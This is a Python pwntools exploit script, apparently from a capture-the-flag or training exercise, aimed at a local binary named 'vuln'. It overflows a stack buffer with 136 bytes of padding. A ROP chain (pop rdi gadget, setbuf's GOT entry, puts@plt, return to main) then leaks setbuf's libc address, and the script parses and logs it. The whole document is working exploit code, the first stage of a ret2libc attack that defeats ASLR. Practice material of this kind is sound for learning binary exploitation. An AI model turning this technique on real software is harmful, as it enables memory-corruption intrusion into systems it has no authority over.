import pwnlib.util.packing as pack
from pwn import log, process, remote

p = process("./vuln")  # Local binary

padding = b"A" * 136
pop_rdi = 0x400913  # ROP Gadget for popping rdi
setbuf_at_got = 0x601028  # Address of setbuf() in GOT
puts_at_plt = 0x400540  # Address of puts() in PLT
main = 0x400771  # Address of main for returning safely after leaking setbuf() address in libc

# ? Craft the payload to leak address of setbuf in libc
payload = padding  # Pad the stack until the stored RIP
payload += pack.p64(pop_rdi)  # Set the address of setbuf() in GOT as the first argument of puts()
payload += pack.p64(setbuf_at_got)  # This will be the first argument of puts()
payload += pack.p64(puts_at_plt)  # Call puts()
payload += pack.p64(main)  # Return to main() so the program doesnt crash

# ? Send the payload
p.sendline(payload)
p.recvline()  # Discard data we dont need
p.recvline()  # Discard data we dont need
leak = pack.u64(p.recvline().strip().ljust(8, b"\x00"))  # Format the address of setbuf() properly
log.info(f"Leaked setbuf Address -> {hex(leak)}")
